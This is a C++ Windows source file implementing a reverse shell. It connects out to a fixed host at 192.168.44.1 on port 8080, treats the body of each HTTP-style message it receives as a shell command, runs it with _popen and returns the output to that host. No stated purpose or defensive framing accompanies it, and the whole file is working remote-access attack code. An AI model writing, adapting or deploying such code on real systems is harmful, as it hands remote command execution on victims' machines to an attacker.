#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

string executeCommand(const string& command) {
    char buffer[128];
    string result = "";
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) return "popen failed!";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}

int main() {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    char buffer[4096];

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "WSAStartup failed." << endl;
        return 1;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        cout << "Socket creation failed." << endl;
        WSACleanup();
        return 1;
    }

    // Setup server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080);
    serverAddr.sin_addr.s_addr = inet_addr("192.168.44.1");

    // Connect to server
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "Failed to connect to server." << endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    while (true) {
        // Receive HTTP request
        int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) {
            cout << "Connection closed or error." << endl;
            break;
        }

        buffer[bytesReceived] = '\0';
        string request(buffer);

        // Parse HTTP request
        size_t bodyPos = request.find("\r\n\r\n");
        if (bodyPos == string::npos) {
            cout << "Invalid HTTP request." << endl;
            continue;
        }

        string command = request.substr(bodyPos + 4);
        cout << "Command received: " << command << endl;

        // Execute command
        string result = executeCommand(command);

        // Send HTTP response
        ostringstream response;
        response << "HTTP/1.1 200 OK\r\nContent-Length: " << result.size() << "\r\n\r\n" << result;
        send(sock, response.str().c_str(), response.str().size(), 0);
    }

    // Cleanup
    closesocket(sock);
    WSACleanup();

    return 0;
}
